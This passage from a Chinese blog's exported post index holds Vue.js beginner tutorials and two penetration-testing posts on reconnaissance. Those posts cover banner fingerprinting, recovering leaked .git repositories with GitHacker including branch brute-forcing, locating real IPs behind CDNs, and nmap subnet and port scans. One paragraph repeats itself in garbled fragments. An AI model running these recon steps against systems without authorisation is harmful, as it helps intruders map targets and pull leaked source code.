&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">purchased</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> Vuejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Vuejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集（2）：Banner识别、敏感目录</title>
      <link href="/2023/03/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%882%EF%BC%89%EF%BC%9ABanner%E8%AF%86%E5%88%AB%E3%80%81%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95/"/>
      <url>/2023/03/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%882%EF%BC%89%EF%BC%9ABanner%E8%AF%86%E5%88%AB%E3%80%81%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="banner识别">Banner识别</h2><p>识别一个网站的Banner信息（服务器对外显示的一些基础信息）对整个渗透测试过程具有十分重要的作用。我们往往可以通过网站网站的Banner信息，可以得到很多方向与思路，如尝试相关历史漏洞，或根据当前系统的特性，进行尝试。</p><ol><li><p><strong>操作系统</strong></p><ul><li>ping判断，Windows TTL一般为128，Linux则为64。TTL大于100一般为Windows，几十的一般为Linux</li><li>nmap -O</li><li>Windows大小写不敏感，Linux大小写区分</li></ul></li><li><p><strong>网站服务 \ 容器类型</strong></p><ul><li>F12查看响应头Server字段</li><li>浏览器插件 Wappalyzer</li></ul></li><li><p><strong>脚本类型</strong></p><p>通过插件也可以查到脚本类型</p></li><li><p><strong>数据库类型</strong></p></li><li><p><strong>CMS识别</strong> CMS：网站内容管理</p><p>常见的CMS：dedecms（织梦）、Discuz、phpcms等</p><ul><li><p>在线识别工具</p><p><a href="http://whatweb.bugscaner.com/look/">在线指纹识别,在线cms识别小插件–在线工具 (bugscaner.com)</a></p></li><li><p>Onlinetools</p><p><a href="https://github.com/iceyhexman/onlinetools">https://github.com/iceyhexman/onlinetools</a></p></li></ul></li></ol><p>Wappalyzer除了作为一个浏览器插件，还具有一个Python库<code>python-Wappalyzer</code>。</p><h2 id="敏感目录">敏感目录</h2><img src="https://image.icewindy.cn/202209192134826.png" alt="image-20220919213442779" style="zoom:50%;" /><ol><li><strong>Github泄露</strong></li></ol><p>部分开发人员将网站上传至开源网站的时候，忘记删除敏感信息。此类信息可以在Github上搜索公司的特定信息，查看是否有程序员将这些信息上传到github上</p><ol start="2"><li><strong>.git泄露</strong></li></ol><p>Git是一个主流的分布式版本控制系统，开发人员在开发过程中，经常会遗忘<code>.git</code>文件夹，导致获取到开发人员提交过的所有源码，导致可以重建还原工程源文件，进而可能导致服务器被攻击沦陷。</p><p>（1）常规git泄漏</p><p>不需要额外操作，通过现成工具或者自行编写的代码即可获得泄漏的源码</p><p>工具：<a href="https://github.com/denny0223/scrabble">https://github.com/denny0223/scrabble</a></p><p>使用方法：<code>scrabble &lt;url&gt;</code></p><p>还可以使用更为强大的GitHacker对其进行还原：<a href="https://github.com/WangYihang/GitHacker">https://github.com/WangYihang/GitHacker</a></p><p>GitHacker推荐我们使用Docker的方式运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">打印出帮助信息</span></span><br><span class="line">docker run wangyihang/githacker --help</span><br></pre></td></tr></table></figure><p>常见的用法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">简单使用</span></span><br><span class="line">docker run -v $(pwd)/results:/tmp/githacker/results wangyihang/githacker --output-folder /tmp/githacker/results --url http://127.0.0.1/.git/</span><br></pre></td></tr></table></figure><ol><li>使用 <code>docker run</code> 命令启动一个 Docker 容器，并在容器中运行 <code>GitHacker</code> 工具。</li><li>使用 <code>-v</code> 选项将主机的 <code>./results</code> 目录挂载到容器中的 <code>/tmp/githacker/results</code> 目录，以便将工具输出的结果保存到主机中。</li><li>使用 <code>wangyihang/githacker</code> 参数指定要使用的 Docker 镜像，该镜像包含了 <code>GitHacker</code> 工具的运行环境。</li><li>使用 <code>--output-folder /tmp/githacker/results</code> 选项指定了工具输出结果的本地保存路径为 <code>/tmp/githacker/results</code> 目录。</li><li>使用 <code>--url http://127.0.0.1/.git/</code> 选项指定了要扫描的目标网站的 URL，该 URL 暴露了 <code>.git</code> 文件夹。</li></ol><p>（2）git回滚</p><p>在有些时候，我们需要的敏感文件可能在修改中被删除或者覆盖了，这时候我们可以通过git的回滚功能<code>git reset</code>恢复到以前的版本。</p><p>我们利用上面<code>scrabble</code>工具获取到源码后，在通过<code>git reset --hard HEAD^</code>跳回到上一版本，或者使用类似的命令跳到其他版本（具体操作可以看我之前写的GIt操作），然后就可以获取到我们想要的敏感文件。</p><p>除此之外，还有<code>git log -stat</code>查看每次提交修改文件，<code>git diff HEAD commit -id</code>比较当前版本与想查看的版本之间的变化。</p><p>（3）git分支</p><p>Git允许多条分支同时开发，而不影响开发主线，往往的，我们需要的敏感文件也可能藏身与不同分支中，因此我们需要切换到不同的分支找到我们需要的文件。</p><p>当我们还原git项目后，我们使用检查<code>git reflog</code>，查看本地仓库中最近使用的引用的历史记录。通过类似的手段，发现其他分支。</p><p>GitHacker还提供了暴力猜解分支和标签名称的功能：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v $(pwd)/results:/tmp/githacker/results wangyihang/githacker --brute --output-folder /tmp/githacker/results --url http://127.0.0.1/.git/</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>网站备份文件</strong></li></ol><p><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">7kbstorm/7kbscan-WebPathBrute: 7kbscan-WebPathBrute Web路径暴力探测工具 (github.com)</a></p><ol start="4"><li><strong>目录扫描工具</strong></li></ol><p>dirsearch是一个强大的开源的目录扫描工具：</p><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><h2 id="敏感备份文件">敏感备份文件</h2><ol><li><strong>gedit备份文件</strong></li></ol><p>gedit在编辑保存后，会在当前目录生成一个后缀为<code>～</code>的文件，文件内容就是刚刚编辑的内容。</p><ol start="2"><li><strong>vim备份文件</strong></li></ol><p>vim在用户编辑文件时，但意外退出时，会在当前目录下生成一个备份文件：<code>.文件名.swp</code>，该文件用于备份缓冲区中的内容，即意外退出时的文件内容。</p><p>在当前目录下创建一个同名文件，使用<code>vim -r 文件名</code>即可还原备份文件。</p><p>注：vim在第一次意外退出时生成的备份文件为<code>swp</code>，第二次为<code>swo</code>，第三次为<code>swn</code>，以此类推。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集（1）：概述</title>
      <link href="/2023/03/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%881%EF%BC%89%EF%BC%9A%E5%9F%9F%E5%90%8D%E3%80%81IP%E3%80%81%E7%AB%AF%E5%8F%A3/"/>
      <url>/2023/03/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%881%EF%BC%89%EF%BC%9A%E5%9F%9F%E5%90%8D%E3%80%81IP%E3%80%81%E7%AB%AF%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="前期信息收集">前期信息收集</h2><p>信息收集是指通过各种方式获取所需要的信息</p><p>信息包括目标站点ip、中间件、脚本语言、端口、邮箱等，包括资产收集但不限于资产收集</p><p>信息收集的意义</p><ul><li>渗透测试成功的保障</li><li>更多的暴露面</li><li>更大的可能性</li></ul><p>信息收集的分类</p><ul><li><p>主动信息收集</p><p>通过直接对网站进行操作、扫描等，这种是有网络流量经过目标服务器的信息收集方式</p></li><li><p>被动信息收集</p><p>基于公开的渠道，如搜索引擎，在不与目标交互的情况下获取信息，并尽量避免留下痕迹</p></li></ul><p>需要收集的信息</p><ul><li>服务器信息（端口、服务、真实ip）</li><li>网站信息(网站架构[操作系统、中间件、数据库、编程语言]、指纹信息、WAF、敏感目录、敏感文件、源码泄露、旁站、C段)</li><li>域名信息(whois、 备案信息、子域名)</li><li>管理员信息(姓名、职务、生日、联系电话、邮件地址)</li><li>以上均是包括但不限于</li></ul><h3 id="域名信息收集">域名信息收集</h3><p><strong>whois查询</strong></p><p>通过whois查询，我们可以收集到域名的ip及其所有者的信息</p><p>可以通过域名注册商、站长工具、命令行查询等等方式查询到whois</p><p><strong>域名备案信息</strong></p><p>在中国大陆解析网站都需要备案，备案具有网站的很多信息，同样的我们也可以通过站长工具进行查询</p><p><strong>注册人、邮箱反查</strong></p><p>通过whois获取注册人和邮箱，再通过注册人和邮箱反查域名</p><p>缺点是很多公司都是dns解析的运营商注册的，并不能很好的获取到信息</p><p><strong>子域名收集</strong></p><p>通过搜索子域名，找到主域名的其他子网站，由于主网站往往是防御做最好的，因此可以作为寻找突破口的作用</p><ol><li><p>google hacking</p><p>这是Google提供的一个信息搜集作用的语法，具体语法可以参考：</p><p><a href="https://zhuanlan.zhihu.com/p/25715992">详解GOOGLE HACK语法 - 知乎 (zhihu.com)</a></p><p>最简单的用法就是：<code>site:域名</code>，可以找到该域名的子域名</p></li><li><p>第三方web接口查询</p><p><a href="https://dnsdumpster.com/">DNSdumpster.com - dns recon and research, find and lookup dns records</a></p><p><a href="https://tool.chinaz.com/subdomain/">子域名查询 - 站长工具 (chinaz.com)</a></p></li><li><p>网络空间安全搜索引擎</p><p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p><p><a href="https://www.zoomeye.org/">首页 - 网络空间测绘,网络安全,漏洞分析,动态测绘,钟馗之眼,时空测绘,赛博测绘 - ZoomEye(“钟馗之眼”)网络空间搜索引擎</a></p><p><a href="https://www.shodan.io/">Shodan Search Engine</a></p><p>这种搜索引擎跟普通搜索引擎的区别在于，这种搜索引擎会一直对公网进行扫描，可以通过这种引擎，用被动收集信息，达到一定的主动收集方式的效果，缺点是这种引擎一般都是收费的</p></li><li><p>ssl证书查询</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p><p><a href="https://developers.facebook.com/tools/ct/search/">https://developers.facebook.com/tools/ct/search/</a></p><p>可以查询到https协议的网站的信息</p></li><li><p>js文件发现子域名</p><p><a href="https://github.com/Threezh1/JSFinder">Threezh1/JSFinder: JSFinder is a tool for quickly extracting URLs and subdomains from JS files on a website. (github.com)</a></p><p>可以通过一些自动化工具来发现子域名</p></li><li><p>借助各种工具</p></li></ol><h3 id="ip信息收集">IP信息收集</h3><ol><li><p><strong>ip反查域名</strong></p><p>如果渗透目标为虚拟主机，那么通过IP反查到的域名信息很有价值，因为一台物理服如果渗透目标为虚拟主机，那么通过IP反查到的域名信息很有价值，因为一台物理服务器上面可能运行多个虚拟主机。这些虚拟主机有不同的域名，但通常共用一个IP地务器上面可能运行多个虚拟主机.这些虚拟主机有不同的域名，但通常共用一个IP地址。如果你知道有哪些网站共用这台服务器，就有可能通过此台服务器上其他网站的漏洞获取服务器控制权，进而迂回获取渗透目标的权限，这种技术也称为“旁注&quot;漏洞获取服务器控制权，进而迂回获取渗透目标的权限，这种技术也称为**“旁注”**</p></li><li><p><strong>域名查询ip</strong></p></li><li><p><strong>判断与绕过CDN</strong></p><p>由于CDN会导致我们在查询域名对应IP时，查询到的是CDN，因此我们需要一些方法去判断和绕过CDN以获得真实IP</p><ul><li><p>多地ping</p><p>多地ping可以查看对应ip是否唯一</p></li><li><p>国外访问</p><p>通过国外访问的方式，有些网站设置CDN可能没有把国外的访问包含进去</p></li><li><p>查询子域名的IP</p><p>由于CDN收费高，很多站长仅只对主站或者流量大的子站做了CDN，而很多小旁站子站点和主站常常是在同一台服务器或者同一个C段内，因此可以通过这种方式辅助查找网站真实IP</p></li><li><p>查看phpinfo文件</p><p>如果是使用Apache HTTP Server的网站，其会内置一个phpinfo.php文件，通过访问这个文件，可以在内部找到一个参数<code>SERVER_ADDR</code>，其保存了服务器的真实地址或者内部地址</p><p>不常用，因为大部分网站管理员都会自行删除该文件使其不暴露</p></li><li><p>Mx记录邮件服务</p><p>缺陷：需要web服务器和邮件服务器在同一ip或同一c段</p></li><li><p>网络空间搜索引擎</p><p><a href="https://search.censys.io/">Censys Search</a></p></li><li><p>查询历史DNS记录</p><p><a href="https://www.dnsdb.io/zh-cn/">DNSDB</a></p><p><a href="https://viewdns.info/">ViewDNS.info - Your one source for DNS related tools!</a></p><p><a href="https://securitytrails.com/">SecurityTrails: Data Security, Threat Hunting, and Attack Surface Management Solutions for Security Teams</a></p><p><a href="https://www.ip138.com/">iP地址查询–手机号码查询归属地 | 邮政编码查询 | iP地址归属地查询 | 身份证号码验证在线查询网 (ip138.com)</a></p><p>这是一个非常实用的方式！</p></li></ul></li><li><p><strong>C段存活主机探测</strong></p><ul><li><p>Nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP www.XXX.com/24</span><br><span class="line">nmap -sP 192.168.1.*</span><br></pre></td></tr></table></figure></li><li><p>各种扫描器</p></li></ul></li></ol><h3 id="端口信息收集">端口信息收集</h3><p><strong>端口类型：</strong></p><ul><li>周知端口：众所周知的端口号，一般都用于固定分配给常用的服务，范围：0-1023</li><li>动态端口：一般不固定分配某种服务，范围：49152-65535</li><li>注册端口：用于分配给用户进程或程序，范围：1024-49151</li></ul><h4 id="nmap">Nmap</h4><p>一款开源的网络探测和安全审查的工具</p><p><strong>功能介绍</strong></p><ul><li>主机发现</li><li>端口发现</li><li>服务发现</li><li>检测操作系统，硬件地址，以及软件版本</li><li>检测脆弱性漏洞</li></ul><p><strong>端口状态</strong></p><p><img src="https://image.icewindy.cn/202303251343237.png" alt="image-20220918201629375"></p><p><strong>基础用法</strong></p><p>下面是一个经典的nmap扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.1</span><br></pre></td></tr></table></figure><p>-A：启用一个全面的扫描</p><p>-T4：时序选择，有T0-T5不同的六种选项，可以指定不同的速度，速度为0-5递增，但网络带宽需求增加，T5是牺牲准确度来提升速度，扫描国内网站常用为T4</p><p>目标指定的方式：</p><ul><li>单一主机扫描：192.168.1.1</li><li>子网扫描：192.168.1.1/24</li><li>多主机扫描：192.168.1.1 192.168.100.1</li><li>主机范围扫描：192.168.1.1-100</li><li>IP列表扫描：-iL list.txt</li><li>除了指定IP以外的子网主机：192.168.1.1/24 --exclude 192.168.1.1</li><li>除了指定文件中的IP的子网主机：192.168.1.1/24 --excludefile list.txt</li><li>特定端口扫描：nmap -p 80,21,23 192.168.1.1</li></ul><p>一些常用的参数：</p><p>-sS：SYN扫描，半开放扫描。打开一个不完整的TCP连接，也就是不需要三次握手。优点是不需要产生任何会话，目标主机也不会记录该扫描，扫描速度快，效率高。缺点是需要最高权限执行</p><p>-sA：ACK扫描</p><p>-sP：ICMP扫描，通过PING扫描</p><p>-sT：TCP扫描，通过完整的TCP连接扫描</p><p>-Pn：扫描前不进行ping</p><p>-iL：导入扫描列表</p><p>-v/sV：探测版本，可能会减缓扫描速度</p><p>-oG 文件名：按照nmap的格式输出文件</p><p>-O：探测操作系统版本</p><p>–script：指定脚本进行漏洞扫描</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuejs开发入门（2）：v-for、v-bind、v-model</title>
      <link href="/2023/03/24/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%882%EF%BC%89%EF%BC%9Av-for%E3%80%81v-bind%E3%80%81v-model/"/>
      <url>/2023/03/24/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%882%EF%BC%89%EF%BC%9Av-for%E3%80%81v-bind%E3%80%81v-model/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout 02-start</span><br></pre></td></tr></table></figure><h2 id="v-for">v-for</h2><p>打开示例代码，我们看到我们返回值内有一个列表。</p><p><img src="https://image.icewindy.cn/202303241026412.png" alt="image.png"></p><p>加入我们需要将这个列表在HTML文档中展示出来，我们并不需要一行一行手动使用插值表达式，vue给我们提供了一个标签内的属性——<code>v-for</code>，可以很方便的循环我们的标签。</p><p>在v-for值内我们通过<code>item in items</code>的形式，遍历items内的值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;food in foods&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;food.name&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-bind">v-bind</h2><p>我们可以看到我们在foods的属性内有一个图片属性，如果我们想展示我们的图片，直接使用插值表达式是不可以的，因为插值表达式只会将数据以文本文档的形式展示到网页上，并不能展示图片等。</p><p>此时我们需要用到vue中提供的v-bind来与HTML中属性和数据进行绑定。对于我们不同的HTML标签，我们可以在其属性前面加上<code>v-bind:</code>为属性与数据进行绑定</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;food in foods&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;food.image&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;food.name&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>值得注意的事，属性内并不需要使用插值表达式，直接使用属性即可。</p><h2 id="v-model">v-model</h2><p>v-bind是单向的，是从Vue里直接反应到DOM上的。而这里介绍的v-model是双向的，Vue变动DOM会变动，且DOM变动Vue也会变动。</p><p>加入我们现在需要写一个复选框，让Vue的属性发生变动，且我们可以加入一个值的展示，让我们展示出Vue内值的变化</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;food.image&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;food.name&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;food.purchased&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;food.purchased&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下所示</p><p><img src="https://image.icewindy.cn/202303241610863.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> Vuejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Vuejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuejs开发入门（1）：创建应用与插值表达式</title>
      <link href="/2023/03/24/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%881%EF%BC%89%EF%BC%9A%E5%88%9B%E5%BB%BA%E5%BA%94%E7%94%A8%E4%B8%8E%E6%8F%92%E5%80%BC%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2023/03/24/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%881%EF%BC%89%EF%BC%9A%E5%88%9B%E5%BB%BA%E5%BA%94%E7%94%A8%E4%B8%8E%E6%8F%92%E5%80%BC%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>开发入门的代码示例来源于</p><ul><li>技术蛋老师 <a href="https://space.bilibili.com/327247876">https://space.bilibili.com/327247876</a></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/eggtoopain/vue3-entry-video-related-code</span><br><span class="line">git checkout 01-start</span><br></pre></td></tr></table></figure><h2 id="创建应用">创建应用</h2><p>每次使用Vue的时候，我们都需要使用创建App，通过Vue内的createApp函数我们可以很方便的创建我们的一个App。</p><p>这个函数有一个可选选项，我们可以传入一个对象。然后我们还需要使用<code>mount()</code>方法将我们创建的应用挂载到DOM上，没有挂载到DOM上的应用则不受影响</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span> = <span class="title function_">createApp</span>(&#123;&#125;).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>);</span><br></pre></td></tr></table></figure><p>接下来我们在一个div元素中，使用id指明我们挂载的<code>app</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>01<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue@3/dist/vue.global.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Vue</span>.<span class="title function_">createApp</span>(&#123;&#125;).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后打开我们这个页面，通过浏览器开发者工具中的控制台，我们就可以看到vuejs已被成功加载</p><p><img src="https://image.icewindy.cn/202303240947624.png" alt="image.png"></p><h2 id="data-函数">data()函数</h2><p>data函数是在vuejs中用于向DOM传值的函数，它的返回值为一个对象，我们可以将我们需要传递的值放入在这个对象内部</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">createApp</span>(&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><p>通过这个方法，我们在我们的HTML标签内使用<code>&#123;&#123;value&#125;&#125;</code>（<strong>插值表达式</strong>）使用我们在data函数中返回的值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>01<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue@3/dist/vue.global.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Vue</span>.<span class="title function_">createApp</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    title : <span class="string">&#x27;这是一个VueApp&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>打开我们的网页我们就可以看到效果了</p><p><img src="https://image.icewindy.cn/202303240957541.png" alt="image.png"></p><p>在Vuejs内写好数据，然后反馈到DOM中预留的位置，就是Vue使用的基本思路。</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> Vuejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
